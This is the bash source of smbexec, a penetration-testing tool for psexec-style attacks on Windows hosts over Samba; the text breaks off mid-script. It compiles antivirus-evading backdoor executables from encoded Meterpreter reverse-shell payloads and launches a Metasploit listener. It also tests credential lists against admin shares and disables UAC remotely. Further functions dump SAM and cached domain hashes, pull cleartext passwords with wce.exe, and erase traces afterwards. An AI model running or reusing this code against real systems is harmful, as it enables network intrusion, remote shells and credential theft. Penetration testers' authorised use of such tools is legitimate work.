#!/bin/bash
# Rapid psexec style attack using linux samba tools
#
# Written because we got sick of Metasploit PSExec getting popped
# Special thanks to Carnal0wnage who's blog inspired us to go this route
# http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html
#
# Special thanks to @al14s
#
# Copyright (C) 2013 Eric Milam (Brav0Hax) & Martin Bos (Purehate)
#
#This program is free software: you can redistribute it and/or modify
#it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>
#
#############################################################################################

version="1.2.9.1"
codename="Happy Accidents"
# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch Metasploit in a screen session instead of an xterm window.
#unset isxrunning

# Uncomment the following line to launch Metasploit in an xterm window if you've tunneled X over SSH.
#isxrunning=1

# Use the following to enable wine to use crypter.exe to encrypt your payload
# http://www.nullsecurity.net/tools/binary.html
# If you have a 64bit system ensure you have configured wine properly to run 32 bit on 64Bit arch
# or you have set up multiarch otherwise this will fail
enable_crypter=1

trap f_ragequit 2

# Find the files and set the path values based on machine architecture
smbexecpath=$(locate -l 1 smbexeclient | sed 's,/*[^/]\+/*$,,')

if [ ! -e "${smbexecpath}/smbexeclient" ] || [ ! -e "${smbexecpath}/smbwinexe" ]; then
	echo -e "\n\e[1;31m[-]\e[0m You have to compile the executables first.\e[0m\n\e[1;34m[*]\e[0m Please run the installer and select option #4.\n" 1>&2
	exit 1
fi

logfldr=${PWD}/$(date +%F-%H%M)-smbexec
mkdir ${logfldr}

if [ -z "${isxrunning}" ]; then
	echo -e "\n\e[1;31m[-]\e[0m X Windows not detected, your Metasploit session will be launched in screen\n"
	sleep 5
fi

# Workaround to get rid of annoying samba error for patched smbclient
if [ ! -e /usr/local/samba/lib/smb.conf ]; then
	mkdir -p /usr/local/samba/lib/
	cp ${smbexecpath}/patches/smb.conf /usr/local/samba/lib/smb.conf
fi

# See if wce exists in the progs folder
if [ -e "${smbexecpath}/wce.exe" ]; then wce=1; fi

f_ragequit(){ 
echo -e "\n\n\e[1;31m[-]\e[0m Rage-quitting...."
sleep 3
#check if we've got shells in play... if so, we clean those up first...
if [[ "${dirty}" == "1" ]];then
	echo -e "\n\e[1;31m[-]\e[0m We have shells in play we need to cleanup those systems...."
	sleep 2
	f_cleanup
fi

rm -rf /tmp/smbexec/
clear
f_freshstart
f_mainmenu
}
f_vanish(){
clear
f_banner

echo -e "\e[1;34m[*]\e[0m Let's get your payload setup...\n"

# Original idea from vanisher.sh -> Major script modifications by Brav0Hax, al14s & Hostess

	f_revhttp(){
		payload=windows/meterpreter/reverse_http
		f_setup_payload
	}
	f_revhttps(){
		payload=windows/meterpreter/reverse_https
		f_setup_payload
	}
	f_revtcp(){
		payload=windows/meterpreter/reverse_tcp
		f_setup_payload
	}
	f_revtcpdns(){
		payload=windows/meterpreter/reverse_tcp_dns
		f_setup_payload
	}

	f_custompayload(){
		clear
		f_banner
		while [ -z "${payload}" ]; do
			read -p " Please enter your Windows payload (double-tab to list PWD) : " payload
		done
		f_setup_payload
	}
	f_setup_payload(){
		clear
		f_banner
		unset lhost

		echo -e "\n\e[1;34m[*]\e[0m You have chosen the following payload - ${payload}"

		# Gather info to build standard payload
		if [[ "${paychoice}" == "4" ]]; then
			while [ -z "${lhost}" ]; do read -p " Enter DNS Host Name ex: www.attacker.com : " lhost; done
		else
		#List interfaces w/ their IPs
			echo -e "\nActive Interfaces:\n"
			ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
			while [ -z "${lhost}" ]; do read -p "Enter Local Host (LHOST) IP address : " lhost
			    if [[ ! ${lhost} =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
			        unset lhost
			    fi
			done
		fi
		unset port
		while [ -z "${port}" ]; do read -p "What Port Number (LPORT) are we gonna listen to? : " port; done

		f_build_payload
	}
	f_build_payload(){
		#Find proper mingw32 to compile the binary
		mingw=$(find /usr/bin |grep mingw32|grep gcc$|grep -E -v 'amd64|x86_64')
		echo -e "\n\e[1;34m[*]\e[0m Building your payload please be patient..."

		# Create backdoor.exe - puts the file together in order -al14s
		unset p
		enumber=$((RANDOM%12+3))
		seed=$((RANDOM%10000+1))
		echo -e "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <time.h>\n#include <ctype.h>\n#include <windows.h>\nDWORD WINAPI exec_payload(LPVOID lpParameter)\n{\n\tasm(\n\t\"movl %0, %%eax;\"\n\t\"call %%eax;\"\n\t:\n\t:\"r\"(lpParameter)\n\t:\"%eax\");\n\treturn 0;\n}\nvoid sys_bineval(char *argv)\n{\n\tsize_t len;\n\tDWORD pID;\n\tchar *code;\n\tlen = (size_t)strlen(argv);\n\tcode = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\tstrncpy(code, argv, len);\n\tWaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID), INFINITE);\n}\n\nunsigned char ufs[]=" > ${logfldr}/backdoor.c
		for (( i=1; i<=10000;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/' | sed '$a;' >> ${logfldr}/backdoor.c
		msfpayload "${payload}" LHOST="${lhost}" LPORT="${port}" EXITFUNC=thread R | msfencode -e x86/jmp_call_additive -c ${enumber} -t raw | msfencode -e x86/call4_dword_xor -c ${enumber} -t raw | msfencode -e x86/shikata_ga_nai -c ${enumber} -t raw | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX | sed 's/^/void main()\n{\n\tchar *micro = \"/' | sed '$ s/$/"/' | sed '$a;' >> ${logfldr}/backdoor.c
		echo -e "\tsys_bineval(micro);\n\texit(0);\n}\nunsigned char tap[]=" >> ${logfldr}/backdoor.c
		for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
		echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
		${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
		rm ${logfldr}/backdoor.c 
		strip --strip-debug ${logfldr}/backdoor.exe

		if [ -z "${enable_crypter}" ]; then
			echo -e "\n\e[1;34m[*]\e[0m Payload successfully compiled and ready for use"
		else
			unset current_path
			f_encrypt_payload
		fi
		if [ -e "${logfldr}/enc_backdoor.exe" ]; then sha1sum ${logfldr}/enc_backdoor.exe > ${logfldr}/sha1-encbackdoor.hash; fi
		sha1sum ${logfldr}/backdoor.exe > ${logfldr}/sha1-backdoor.hash
		f_resource_file
	}
	f_encrypt_payload(){
		crypter_path=$(locate -l 1 crypter.exe | sed 's,/*[^/]\+/*$,,')
		if [ ! -z ${crypter_path} ]; then
			echo -e "\n\e[1;34m[*]\e[0m Encrypting Payload..."
			sleep 1
			current_path=${PWD}
			cd ${crypter_path} #Have to run crypter from its own dir based on deps
			wine crypter.exe ${logfldr}/backdoor.exe /tmp/smbexec/enc_backdoor.exe > /dev/null
			sleep 5
			cd ${current_path} #Go back to whence you came
			if [ -e "/tmp/smbexec/enc_backdoor.exe" ]; then
				mv /tmp/smbexec/enc_backdoor.exe ${logfldr}/backdoor.exe
				echo -e "\n\e[1;34m[*]\e[0m Payload successfully encrypted and ready for use"
			else
				echo -e "\n\e[1;34m[*]\e[0m Payload not encrypted, using obfuscated binary in ${logfldr}"
			fi
		fi
	}
	f_resource_file(){
		unset session_timeout
		if [ "${paychoice}" -le "2" ]; then
			session_timeout="set SessionCommunicationTimeout 600"
		fi
		cat <<-EOF > ${logfldr}/metasetup.rc
			spool ${logfldr}/msfoutput-${DATE}.txt
			use exploit/multi/handler
			set payload ${payload}
			set LHOST ${lhost}
			set LPORT ${port}
			${session_timeout}
			set ExitOnSession false
			set InitialAutoRunScript migrate -f
			exploit -j -z
		EOF
		if [ "${sysexpchoice}" == "2" ]; then
			echo -e "\n\e[1;34m[*]\e[0m Payload and Resource file successfully created"
			sleep 3
			f_mainmenu
		else
			echo -e "\n\e[1;34m[*]\e[0m Resource file successfully created, launching Metasploit..."

			if [ -z ${isxrunning} ]; then
				echo -e "\n\e[1;34m[*]\e[0m Launching Metasploit in a screen session, once its loaded hit Ctrl-a then a and then d to detach and continue attack setup"
				echo -e "\n\e[1;34m[*]\e[0m Please press enter to continue."
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r ${logfldr}/metasetup.rc"
			else
				xterm -geometry -0+0 -hold -e msfconsole -r ${logfldr}/metasetup.rc &
				sleep 10
			fi
		fi
	}

	# Function for supplying your own payload & rc file
	f_payloadrc(){
		unset valid
		while [[ ${valid} != 1 ]]; do
            echo -ne "\n Please provide the full path to your payload file (ex: /root/Desktop/backdoor.exe) (double-tab to see PWD) : "
			read -e -p " " LPATH
			if [ -e ${LPATH} ]; then
				valid=1
			else
				echo "Not a valid file/path."
			fi
		done

		read -p " Do you have a Metasploit listener running already? [y/N] : " listener
		listener=$(echo ${listener} | tr 'A-Z' 'a-z')

		if [ "${listener}" = "n" ] || [ -z "${listener}" ]; then
			unset valid
			while [ "${valid}" != "1" ]; do
				echo -ne "\n Please provide the full path to your Metasploit rc file (ex: /root/Desktop/metasploit.rc) (double-tab to see PWD) :"
				read -e -p " " rcpath
				if [ -e "${rcpath}" ] && [[ $(echo "${rcpath}" | awk '{ print substr( $0, length($0)-1, length($0) ) }') == "rc" ]]; then
					valid=1
				else
					echo "Not a valid .rc file/path."
				fi
			done
			if [ ! -z "${isxrunning}" ]; then
				xterm -geometry -0+0 -hold -e msfconsole -r ${rcpath} & > /dev/null 2>&1
				sleep 10
			elif [ -z "${isxrunning}" ]; then
				echo -e "\n\e[1;34m[*]\e[0m Launching Metasploit in a screen session, once its loaded hit Ctrl-a then d to detach and continue attack setup"
				echo -en "\n\e[1;34m[*]\e[0m Please press enter to continue..."
				read -p " "
				screen -mS Metasploit -t msfconsole bash -c "msfconsole -r ${rcpath}"
			fi
		fi
	}
#Menu Items
echo "Select Payload"
echo "  1. windows/meterpreter/reverse_http"
echo "  2. windows/meterpreter/reverse_https"
echo "  3. windows/meterpreter/reverse_tcp"
echo "  4. windows/meterpreter/reverse_tcp_dns"
echo "  5. Other Windows Payload"
echo "  6. I already have a payload and Metasploit rc file"
echo "  7. Back (Main Menu)"
echo -en "\n Choice :"
read -p " " paychoice
case "${paychoice}" in
	1) f_revhttp ;;
	2) f_revhttps ;;
	3) f_revtcp ;;
	4) f_revtcpdns ;;
	5) f_custompayload ;;
	6) f_payloadrc ;;
	7) f_mainmenu ;;
	*) f_vanish ;;
esac
f_getinfo
}
f_banner(){
	clear
	echo "************************************************************"
	echo -e "		      \e[1;36msmbexec - v${version}\e[0m       "
	echo "	   psexec style attacks with samba tools              "
	echo "                Codename - ${codename}	          "
	echo "************************************************************"
	echo
}
#Function to verify logins can actually login into systems via C$
#Metasploit smb_login only verifies login is valid (IPC$) not if they can login to systems remotely as admin
f_smb_login(){
f_banner
f_get_user_list
f_parse_user_list
f_get_target_list
f_verify_credentials
sleep 5
f_freshstart
f_mainmenu
}
f_get_user_list(){
unset user_list
if [[ -e "${logfldr}/hashes/DC/cred.lst" ]]; then p="[${logfldr}/hashes/DC/cred.lst]"; fi
read -e -p " Please provide the path to your credential list (user<tab>pass or hash) ${p}: " user_list
if [ -z ${user_list} ]; then user_list="${logfldr}/hashes/DC/cred.lst"; fi
if [ ! -e ${user_list} ]; then echo -e "\e[1;31m[-]\e[0m The file provided does not exist..."; f_get_user_list; fi
unset p
}
f_parse_user_list(){
#Credential file should be TAB separate. Below TABs are converted to '%' which is what smbclient needs as a separator
sed -e 's:\t:%:g' ${user_list} > /tmp/smbexec/credentials.lst
}
f_get_target_list(){
if [[ -e "${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)" ]]; then p="[${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)]"; fi
read -e -p " Target IP or host list ${p}: " tf
if [ -z ${tf} ]; then tf="${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)"; fi
if [[ ${tf} =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	echo ${tf} > /tmp/smbexec/rhost.txt
	RHOSTS=/tmp/smbexec/rhost.txt
elif [[ -e ${tf} ]]; then
	RHOSTS=${tf}
else
	echo -en "\e[1;31m[-]\e[0m Invalid IP or file does not exist.\n"
	sleep 3
	f_get_target_list
fi
read -e -p " Please provide the Domain for the user account specified [localhost] : " SMBDomain
if [ -z ${SMBDomain} ]; then SMBDomain=.;fi
}
f_verify_credentials(){
unset SMBHASH
unset password_hash
if [ -z "${check_for_da}" ]; then
	read -p " Do you want to include a check for DA/EA processes on the systems? [y/N] : " da_check
	da_check=$(echo ${da_check} | tr 'A-Z' 'a-z')
	if [ "${da_check}" = "y" ]; then check_for_da=1; fi
	echo
fi

for i in $(cat ${RHOSTS}); do
# Check to see if login is valid
	for j in $(cat /tmp/smbexec/credentials.lst); do
		unset SMBHASH
		password_hash=$(echo ${j}|cut -d "%" -f2-)
		if [ "$(echo ${password_hash}| wc -m)" -ge "65" ]; then
			export SMBHASH=${password_hash} # This is required when using a hash value
		fi
		${smbexecpath}/smbexeclient //${i}/C$ -U ${SMBDomain}/${j} -c showconnect &> /tmp/smbexec/credential.chk
		f_successful_login
	done
if [ -e /tmp/smbexec/${i}.successful.logins.tmp ]; then
	cat /tmp/smbexec/${i}.successful.logins.tmp| cut -d " " -f9-10 > ${logfldr}/${i}.successful.logins
fi

if [ -e /tmp/smbexec/da-systems.lst ]; then
	cat /tmp/smbexec/da-systems.lst|cut -d " " -f2- > ${logfldr}/systems-with-da.lst
fi
done
}
f_successful_login(){
username=$(echo ${j}|cut -d "%" -f1|tr '[:upper:]' '[:lower:]')
password=$(echo ${j}|cut -d "%" -f2-)
successful_login=$(cat /tmp/smbexec/credential.chk|grep "//${i}")

if [ -z "${successful_login}" ]; then
	if [ ${sysenumchoice} != "4" ]; then echo -e "\e[1;31m[-]\e[0m Remote login failed to ${i} with credentials ${username} ${password}"; fi
else
	if [ ${sysenumchoice} != "4" ]; then echo -e "\e[1;32m[+]\e[0m Remote login successful to ${i} with credentials ${username} ${password} " | tee -a /tmp/smbexec/${i}.successful.logins.tmp; fi
	if [ ! -z ${check_for_da} ]; then
		f_get_domain_admin_users
		f_get_logged_in_users
		f_compare_accounts
	fi
fi
}
f_get_domain_admin_users(){
if [ -f "/tmp/smbexec/admins.lst" ] && [ -s "/tmp/smbexec/admins.lst" ]; then
	admins_list_created=1
else
	${smbexecpath}/smbwinexe --system -U ${SMBDomain}/${j} //${i} "CMD /C net group \"Domain Admins\" /domain" &> /tmp/smbexec/domainadmins.tmp
	${smbexecpath}/smbwinexe --system -U ${SMBDomain}/${j} //${i} "CMD /C net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/enterpriseadmins.tmp
	cat /tmp/smbexec/domainadmins.tmp /tmp/smbexec/enterpriseadmins.tmp > /tmp/smbexec/admins.tmp
	admins_list_check=$(cat /tmp/smbexec/admins.tmp |egrep '(error|winexe)')
	if [ -z "${admins_list_check}" ]; then
		cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS|not be found|domain controller|HELPMSG)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|tr '[:upper:]' '[:lower:]'|sort -u> /tmp/smbexec/admins.lst
	fi
fi

}
f_get_logged_in_users(){
${smbexecpath}/smbwinexe --uninstall --system -U ${SMBDomain}/${j} //${i} "CMD /C tasklist /V /FO CSV" &> /tmp/smbexec/tasklist.tmp
#win2k doesn't have tasklist - this will hopefully prevent error spewing
f_tasklisk_check

if [ -z "${tasklist_check}" ]; then
	cat /tmp/smbexec/tasklist.tmp|grep -i ${SMBDomain}|cut -d '"' -f14|egrep -i -v '(local service|network service|system|user name)'|cut -d "\\" -f2|tr '[:upper:]' '[:lower:]'|sort -u > /tmp/smbexec/tasklist.sorted
	${smbexecpath}/smbwinexe --uninstall --system -U ${SMBDomain}/${j} //${i} "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
	cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|egrep '(Active|Disc)'|grep -v "services\,0"|cut -d "," -f3|tr '[:upper:]' '[:lower:]' > /tmp/smbexec/qwinsta.sorted
	sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
else
	echo -e "\e[1;31m[-]\e[0m Looks like tasklist isn't available for the system, it may be Win2K."
fi
}
f_tasklisk_check(){
tasklist_check=$(cat /tmp/smbexec/tasklist.tmp|grep -o "not recognized")
}
f_compare_accounts(){
unset admins
unset users
if [ -z "${tasklist_check}" ] && [ -s /tmp/smbexec/admins.lst ]; then
	for admins in $(cat /tmp/smbexec/admins.lst); do
        	for users in $(cat /tmp/smbexec/loggedin.users|grep "${admins}");do
        	        if [ ! -z "${users}" ]; then 
        	                echo -e "\e[1;32m [+]\e[0m DA account ${users} is logged in or running a process on ${i} "|tee -a /tmp/smbexec/da-systems.lst
        	        fi
        	done
	done
else
	echo -e "\e[1;31m [-]\e[0m System may not be joined to domain, couldn't check for Admin accounts."
fi
}
f_da_sys_check(){
check_for_da=1
f_smb_login
}
f_uac_setup(){
f_banner
unset p
if [[ -e "${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)" ]]; then
	p="[${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)]"
fi

read -e -p " Target IP or host list ${p}: " tf
if [ -z ${tf} ]; then tf="${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)"; fi

if [[ ${tf} =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	    echo ${tf} > /tmp/smbexec/rhost.txt
	    RHOSTS=/tmp/smbexec/rhost.txt
    elif [[ -e ${tf} ]]; then
	    RHOSTS=${tf}
    else
	    echo -en "   Invalid IP or file does not exist.\n"
	    sleep 3
	    f_uac_setup
fi

f_smbauth

for i in $(cat ${RHOSTS}); do
	#Check proper auth to system first, if no auth...no reason to continue....
	${smbexecpath}/smbexeclient //${i}/C$ -A /tmp/smbexec/smbexec.auth -c showconnect >& /tmp/smbexec/connects.tmp
	f_smbauthinfo
	if [ "${sysenumchoice}" == "5" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ];then
		f_uac_check
	elif [ "${sysexpchoice}" == "3" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
		f_disable_uac
	elif [ "${sysexpchoice}" == "4" ] && [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
		f_enable_uac
	else
		f_smbauthresponse
		sleep 2
	fi
	#Have to unset these because we're in a for loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
done

if [ -e /tmp/smbexec/uac_enabled.lst.tmp ];then
	mv /tmp/smbexec/uac_enabled.lst.tmp ${logfldr}/uac_enabled.lst.${DATE}
fi
f_freshstart
f_mainmenu
}
f_uac_check(){
# Check to see if UAC is enabled on the system
${smbexecpath}/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //${i} "CMD /C reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA" &> /tmp/smbexec/uac.check.tmp
uac_enabled=$(cat /tmp/smbexec/uac.check.tmp | grep -o "0x1")
if [ ! -z "${uac_enabled}" ]; then
	echo -e "\n\e[1;34m[*]\e[0m UAC is enabled on ${i}"
	sleep 1
	echo ${i} >> /tmp/smbexec/uac_enabled.lst.tmp
else
	echo -e "\n\e[1;34m[*]\e[0m UAC does not appear to be enabled on ${i}"
	sleep 1
fi
sleep 3
}
f_disable_uac(){
${smbexecpath}/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //${i} "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f" &> /tmp/smbexec/uac_disable.tmp
disable_success=$(cat /tmp/smbexec/uac_disable.tmp | grep -o "successfully")
if [ ! -z ${disable_success} ]; then
	echo -e "\n\e[1;32m[+]\e[0m UAC has been disabled on ${i}."
	sleep 1
else
	echo -e "\n\e[1;31m[-]\e[0m Could not disable UAC on ${i}."
	sleep 1
fi
sleep 3
}
f_enable_uac(){
${smbexecpath}/smbwinexe --uninstall -A /tmp/smbexec/smbexec.auth //${i} "CMD /C reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f" &> /tmp/smbexec/uac_enable.tmp
enable_success=$(cat /tmp/smbexec/uac_enable.tmp | grep -o "successfully")
if [ ! -z ${enable_success} ]; then
	echo -e "\n\e[1;32m[+]\e[0m UAC has been enabled on ${i}."
	sleep 1
else
	echo -e "\n\e[1;31m[-]\e[0m Could not enable UAC on ${i}."
	sleep 1
fi
sleep 3
}
#Function to grab local hashes and domain cached creds
f_hashgrab(){
creddumpath=$(locate -l 1 -b "\pwdump.py" | sed 's,/*[^/]\+/*$,,')
if [ ! -e "${logfldr}"/hashes ]; then
	mkdir ${logfldr}/hashes
fi
f_banner
f_smbauth
unset p
if [[ -e "${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)" ]]; then p="[${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)]"; fi
read -e -p " Target IP or host list ${p}: " tf
if [ -z ${tf} ]; then tf="${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)"; fi
if [[ ${tf} =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	echo ${tf} > /tmp/smbexec/rhost.txt
	RHOSTS=/tmp/smbexec/rhost.txt
elif [[ -e ${tf} ]]; then
	RHOSTS=${tf}
else
	echo -en "   Invalid IP or file does not exist.\n"
	sleep 3
	f_hashgrab
fi
for i in $(cat ${RHOSTS}); do
	# Check to see if login is valid to the system before it attempts anything else
	${smbexecpath}/smbexeclient //${i}/C$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp
	# Check to see what type of error we got so we can tell the user
	f_smbauthinfo
	f_smbauthresponse
	# Get successful IP addy for cleanup later
	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)
	# If no successful connection was made above this portion is skipped
	if [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
		echo ${ConnCheck} >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file
		if [ ! -d ${logfldr}/hashes/${i} ]; then mkdir ${logfldr}/hashes/${i}; fi
		# Get the registry keys
		${smbexecpath}/smbwinexe -A /tmp/smbexec/smbexec.auth //${i} "CMD /C echo %TEMP%" &> /tmp/smbexec/tempdir.info
		temp_drive=$(cat /tmp/smbexec/tempdir.info| cut -d ":" -f1|tr -d '\r')
		temp_dir=$(cat /tmp/smbexec/tempdir.info| awk -F':' '{ print $2 }'|tr -d '\r')
		${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C reg.exe save HKLM\SAM %TEMP%\sam && reg.exe save HKLM\SYSTEM %TEMP%\sys && reg.exe save HKLM\SECURITY %TEMP%\sec" &> /dev/null
		${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "get ${temp_dir}\\sam ${logfldr}/hashes/${i}/sam" &> /dev/null
		${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "get ${temp_dir}\\sec ${logfldr}/hashes/${i}/sec" &> /dev/null
		${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "get ${temp_dir}\\sys ${logfldr}/hashes/${i}/sys" &> /dev/null
		#Get the hashes out of the reg keys
		if [ -e ${logfldr}/hashes/${i}/sam ] && [ -e ${logfldr}/hashes/${i}/sys ]; then
			${creddumpath}/pwdump.py ${logfldr}/hashes/${i}/sys ${logfldr}/hashes/${i}/sam > ${logfldr}/hashes/${i}/localhashes.lst
			if [ -e ${logfldr}/hashes/${i}/sec ]; then
				${smbexecpath}/cachedump.rb ${logfldr}/hashes/${i}/sec ${logfldr}/hashes/${i}/sys > /tmp/smbexec/dcchashes.tmp
				cat /tmp/smbexec/dcchashes.tmp |grep ":"|cut -d ":" -f1-2 > /tmp/smbexec/dcchashes.lst
				if [ -s /tmp/smbexec/dcchashes.lst ];then mv /tmp/smbexec/dcchashes.lst ${logfldr}/hashes/${i}/dcchashes.lst;fi
			fi
			echo -en "\e[1;32m [+]\e[0m Hashes from ${i} have been dumped...\n"
			sleep 1
		else
			echo -en "\e[1;31m [-]\e[0m Something happened and I couldn't get the registry keys from ${i}...\n"
			sleep 1
		fi
		#Get the clear text passwords with protected wce
		if [ "${wce}" == 1 ]; then
			${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "put ${smbexecpath}/wce.exe ${temp_dir}\\wce.exe" &> /dev/null
			${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${i} "CMD /C %TEMP%\wce.exe -w" &> /tmp/smbexec/wce.tmp
			#Put the passwords in a text file in the logfolder
			cat /tmp/smbexec/wce.tmp|grep :|egrep -v '(non-printable|ERROR|HASH)' > /tmp/smbexec/cleartext.pwds
			#Move cleartext file if it's not empty
			if [ -s /tmp/smbexec/cleartext.pwds ];then mv /tmp/smbexec/cleartext.pwds ${logfldr}/hashes/${i}/cleartext.pwds;fi
			#cleanup the host including wce.exe
			${smbexecpath}/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //${i} "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys && DEL %TEMP%\wce.exe" &> /dev/null
		else
			#cleanup the host minus wce.exe
			${smbexecpath}/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //${i} "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys" &> /dev/null
		fi
	fi
	#Unset the variables because we're in a for-loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
done
sleep 3
f_freshstart
f_mainmenu
}
f_dchashgrab(){
if [ ! -e "${logfldr}"/hashes ]; then mkdir ${logfldr}/hashes; fi
f_banner
f_smbauth
f_finddcs
unset tf
while [ -z ${tf} ]; do
	read -e -p " Domain Controller IP address: " tf
	if [[ ${tf} =~  ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
		echo ${tf} > /tmp/smbexec/rhost.txt
		RHOSTS=/tmp/smbexec/rhost.txt
	else
		echo -en "   Invalid IP address...\n"
		unset tf
	fi
done
f_ntdspath
}
f_ntdspath(){
unset ntdsdrive
read -e -p " Enter NTDS Drive [C:]: " ntdsdrive
if [ -z ${ntdsdrive} ]; then
	ntdsdrive="C:"
fi
unset ntdspath
read -e -p " Enter NTDS Path [\\Windows\\NTDS]: " ntdspath
if [ -z ${ntdspath} ]; then
	ntdspath="\\Windows\\NTDS"
fi
unset ntdssuccess
echo -e "\n\e[1;34m[*]\e[0m Checking to see if the ntds.dit file exists in the provided path"
${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C IF EXIST ${ntdsdrive}${ntdspath}\\ntds.dit ECHO Success" &> /tmp/smbexec/ntds.chk
ntdssuccess=$(cat /tmp/smbexec/ntds.chk|grep -o Success)
if [ -z ${ntdssuccess} ]; then
	echo -e "\e[1;31m[-]\e[0m The ntds.dit file does not exist in the path provided.\n"
	sleep 2
	f_dchashgrab
else
	echo -e "\e[1;32m[+]\e[0m The ntds.dit file was found in the path provided...\n"
	sleep 2
	f_savepath
fi
}
f_savepath(){
unset tempdrive
read -e -p " Enter the Drive to save the Shadow Copy and SYS key [C:]: " tempdrive
if [ -z ${tempdrive} ]; then
	tempdrive="C:"
fi
unset temppath
read -e -p " Enter the Path to save the Shadow Copy and SYS key [\\Windows\\TEMP]: " temppath
if [ -z ${temppath} ]; then
	temppath="\\Windows\\TEMP"
fi
unset tempsuccess
echo -e "\n\e[1;34m[*]\e[0m Checking to see if the provided path exists"
${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C IF EXIST ${tempdrive}${temppath} ECHO Success" &> /tmp/smbexec/temppath.chk
pathsuccess=$(cat /tmp/smbexec/temppath.chk|grep -o Success)
if [ -z ${pathsuccess} ]; then
	echo -e "\e[1;31m[-]\e[0m The path provided does not exist...\n"
	sleep 2
	f_savepath
else
	echo -e "\e[1;32m[+]\e[0m The path provided exists...\n"
fi
echo -e "\e[1;34m[*]\e[0m We have to make sure there is enough disk space available before we do the Shadow Copy"
